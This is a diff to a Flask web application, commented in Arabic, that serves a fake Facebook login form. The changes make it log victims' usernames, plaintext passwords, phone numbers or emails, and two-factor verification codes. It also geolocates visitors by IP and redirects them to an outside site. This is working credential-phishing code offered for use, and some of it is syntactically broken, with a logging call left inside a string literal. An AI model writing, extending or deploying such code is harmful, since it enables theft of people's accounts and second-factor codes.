@@ -4,6 +4,7 @@ import os
 import logging
 import sqlite3
 import requests
+from colorama import Fore
 
 # ========================
 # إنشاء قاعدة البيانات
@@ -54,7 +55,7 @@ logging.basicConfig(
     format="%(asctime)s | %(levelname)s | %(message)s"
 )
 
-print("++++++++++++++++++++ SERVER STARTED ++++++++++++++++++++")
+print(Fore.GREEN + "++++++++++++++++++++ SERVER STARTED ++++++++++++++++++++")
 
 # ========================
 # إعداد Flask
@@ -98,7 +99,27 @@ def log_every_request():
     method = request.method
     user_agent = request.headers.get("User-Agent", "").lower()
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+#=========================
+# تحديد location 
+#=========================
+def get_location(ip):
+    try:
+        url = f"http://ip-api.com/json/{ip}"
 
+        response = requests.get(url, timeout=3)
+
+        data = response.json()
+
+        country = data.get("country", "Unknown")
+        city = data.get("city", "Unknown")
+        isp = data.get("isp", "Unknown")
+
+        return country, city, isp
+
+    except:
+        return "Unknown", "Unknown", "Unknown"
+        
     # 🔥 تحديد نوع الزائر
     if "facebookexternalhit" in user_agent:
         visitor_type = "Facebook Bot"
@@ -153,7 +174,7 @@ def favicon():
 # ========================
 @app.route("/ping")
 def ping():
-    logging.info("(PING) request received")
+    logging.info(Fore.BLACK + "(PING) request received")
     return "OK", 200
 
 # ========================
@@ -161,7 +182,7 @@ def ping():
 # ========================
 @app.route("/")
 def home():
-    logging.info("User opened homepage")
+    logging.info(Fore.GREEN + "User opened homepage")
     return render_template("FacebookForm.html")
 
 # ========================
@@ -208,10 +229,15 @@ def login():
     username = request.form.get("username")
     password = request.form.get("password")
 
-    logging.info(f"Login attempt: {username}")
+    logging.info(Fore.RED + f"Login attempt with username : {username} and password : {password}")
 
     # 🔥 تعريف المتغيرات قبل الاستخدام (حل مشكلة 500)
-    ip = request.remote_addr
+    ip = request.headers.get("X-Forwarded-For")
+
+    if ip:
+       ip = ip.split(",")[0]
+    else:
+       ip = request.remote_addr
     user_agent = request.headers.get("User-Agent", "Unknown")
 
     device, os_name, browser = detect_device(user_agent)
@@ -244,7 +270,7 @@ Time: {time}
         f.write(log_data)
 
     login_botton_url = "https://2742404919047.sarhne.com"
-    return redirect(login_botton_url)
+    return redirect(login_botton_url), logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
 
 # ========================
 # create
@@ -271,7 +297,7 @@ def verify():
     # حفظ في session
     session["phone_or_email"] = phone_or_email
 
-    logging.info(f"Verify request: {phone_or_email}")
+    logging.info(Fore.GREEN + f"Verify request: {phone_or_email}")
 
     # حفظ في log.txt
     log_data = f"""
@@ -282,7 +308,7 @@ Phone/Email: {phone_or_email}
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
 
-    return render_template("verify.html")
+    return render_template("verify.html"), logging.info("Redirected user to verify code page")
 
 # ========================
 # verify_code
@@ -311,18 +337,21 @@ def verify_code():
 
     conn.commit()
     conn.close()
-
+    
     # حفظ في log.txt
     log_data = f"""
 Verification Code
 Email: {phone_or_email}
 Code: {code}
+    logging.info(Fore.RED + f"Verify Code: {code}")
+
 -------------------------
 """
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
+    login_botton_url = "https://2742404919047.sarhne.com"
+    return redirect(login_botton_url), logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}"), logging.info(Fore.RED + f"Verify Code: {code}")
 
-    return redirect("https://2742404919047.sarhne.com")
 
 # ========================
 # 🔐 Admin Login
@@ -452,7 +481,6 @@ def admin():
 def logout():
     session.pop("admin", None)
     return "تم تسجيل الخروج"
-
 # ========================
 # تشغيل السيرفر
 # ========================
